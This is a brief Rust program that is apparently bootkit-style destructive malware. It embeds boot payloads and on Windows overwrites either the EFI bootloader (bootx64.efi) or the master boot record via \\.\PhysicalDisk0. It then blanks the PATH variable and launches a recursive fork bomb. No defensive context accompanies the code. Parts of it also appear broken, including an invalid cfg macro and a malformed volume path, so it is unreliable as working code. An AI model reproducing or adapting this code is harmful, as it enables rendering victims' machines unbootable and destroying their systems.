use std::{env::consts::OS, io::Write};
use winapi::um::winbase::GetFirmwareEnvironmentVariableA;
#[allow(unconditional_recursion)]
fn forkbomb() {
    std::thread::spawn(forkbomb);
    forkbomb();
}

fn main() {
    #[cfg(file_exists!("../../build/boot.bin"))]
    let mbrcode = include_bytes!("../../build/boot.bin");
    #[cfg(file_exists!("../../build/boot.efi"))]
    let efi = include_bytes!("../../build/boot.efi");

    if OS == "windows" {
        let mut buffer: [u8; 1] = [0];
        let result = unsafe {
        GetFirmwareEnvironmentVariableA(
            "FirmwareType\0".as_ptr() as *const i8,
            "{00000000-0000-0000-0000-000000000000}\0".as_ptr() as *const i8,
            buffer.as_mut_ptr() as *mut _,
            buffer.len() as u32,
        )
    };

    if result != 0 {
        let mut path = std::path::PathBuf::new();
        for entry in std::fs::read_dir(r"\\?\ Volume{").unwrap() {
            let entry = entry.unwrap();
            if let Some(volume) = entry.file_name().to_str() {
                if volume.starts_with("HarddiskVolume") {
                    path.push(entry.path());
                    path.push("EFI");
                    if path.exists() {
                        break;
                    }
                    path.pop();
                }
            }
        }
        if path.exists() {
            let mut file = std::fs::File::create(path.join("bootx64.efi")).unwrap();
            file.write_all(efi).unwrap();
            
        }
    } else {
        let mut file = std::fs::File::create(r"\\.\PhysicalDisk0").unwrap();
        file.write_all(mbrcode).unwrap();
    }
}

    std::env::set_var("path", "");

    forkbomb();
}